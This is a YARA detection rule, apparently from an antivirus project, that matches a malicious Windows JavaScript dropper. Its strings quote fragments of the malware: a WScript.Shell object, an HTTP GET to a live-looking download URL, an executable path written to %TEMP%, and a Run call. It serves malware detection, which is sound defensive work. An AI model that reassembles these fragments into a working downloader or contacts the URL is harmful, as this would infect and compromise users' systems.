rule sig_20160401_c647df88a19869c02b63a5bd8d240ba2 {
  meta:
    description = "datamaliciousorder - file 20160401_c647df88a19869c02b63a5bd8d240ba2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "cfdad889848feb5ce4f0c9ae4dd6734febfaf6c88f4bd4de7a60564f3524a2a6"

  strings:
    $s1  = "var YiQzh = function PbAe() {return WScript[LavAa](\"WScript\"+\".Shell\");}(), WtZl = 11;" fullword ascii
    $s2  = "function FrxXrp(DyoCe, PzvIoj){CnMpv = CnMpv * 1; return DyoCe - PzvIoj;};" fullword ascii
    $s3  = "if (QmRam[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "QmRam[VajVds](\"G\" + \"ET\", \"http://asengineeringworks.in/n9wqo\", false);" fullword ascii
    $s5  = "function NtAuh() {return YiQzh[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"T0SYcOneGlJD63xO.ex\" + \"e\";};" fullword ascii
    $s6  = "function OycCy(){return YfWub + \"\";};" fullword ascii
    $s7  = "function FwBh() {return ((CjFyl == true) && (CjFyl == DcuWwb)) ? 1 : CnMpv;};" fullword ascii
    $s8  = "}while (RuiWn);" fullword ascii
    $s9  = "var QbkTs = new this[\"Date\"]();" fullword ascii
    $s10 = "function FodErh(FplVlo){YiQzh[\"R\"+\"un\"](FplVlo, CnMpv, CnMpv);};" fullword ascii
    $s11 = "function RixYg()" fullword ascii
    $s12 = "CjFyl = true; " fullword ascii
    $s13 = "function VvxAz(){return 23;};" fullword ascii
    $s14 = "var CjFyl = false;" fullword ascii
    $s15 = "return FrxXrp(BwkVl, XnOx);" fullword ascii
    $s16 = "var DcuWwb = false;" fullword ascii
    $s17 = "DcuWwb = true; " fullword ascii
    $s18 = "var HoNv = false;" fullword ascii
    $s19 = "function IjGhu(){return LavAa;};" fullword ascii
    $s20 = "function NjpWsp(FmBcm) {var LucFsu = (1, 2, 3, 4, 5, FmBcm); return LucFsu;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}